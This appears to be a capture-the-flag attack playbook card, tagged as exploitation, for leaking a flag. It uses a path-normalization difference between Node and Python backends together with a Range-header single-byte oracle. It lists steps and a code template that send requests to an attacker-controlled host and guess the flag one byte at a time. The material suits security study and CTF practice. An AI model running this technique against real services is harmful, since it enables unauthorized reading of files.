---
name: absolute_form_request_differential_range_byte_oracle
vuln_type: information_disclosure
sub_technique: differential_range_byte_oracle
category: exploitation
safety_level: safe
tags:
- differential
- range
- byte-oracle
- path-normalization
- blind
---

# Absolute-Form Request Target Differential (Node Vs Python) + Range Single-Byte Oracle

## When to Apply

A checker service compares responses from two backends (Node.js and Python) for the same request. When given an absolute-form URL like `http://attacker/../../a`, Node normalizes the path to `/a` (reads the flag file) while Python treats it as a redirect to the attacker's server. The attacker's echo server returns the guessed byte. Range header extracts one byte at a time.

## Prerequisites

- Checker comparing two backend responses for equality
- Node.js backend that normalizes absolute-form request-targets
- Python backend that follows redirects to the authority in the URL
- Attacker-controlled HTTP server reachable from checker

## Steps

1. Start echo server: returns body byte from `?b=XX` query param.
2. For each offset i, for each candidate byte b:
   GET `http://attacker/../../a?b={b:02x}` with `Range: bytes={i}-{i}`
3. Node reads `/a` (flag), returns byte at offset i.
   Python redirects to attacker, gets byte b.
4. If 'Responses match' in checker output → byte b is correct.
5. Append to recovered string. Stop at `}`.

## Code Template

```
target = f'{guess_base}/../../a?b={byte:02x}'
resp = http_get(checker, target, headers={'Range': f'bytes={offset}-{offset}'})
if 'Responses match' in resp.body: found = byte
```

## Examples

### Example 1

- **node_behavior**: normalizes absolute-form URI path → reads local /a
- **python_behavior**: treats authority as redirect target → fetches from attacker
- **flag_prefix**: DH{

The differential behavior between Node and Python HTTP path handling is the core insight. Parallel threads (8+) speed up the byte search significantly.
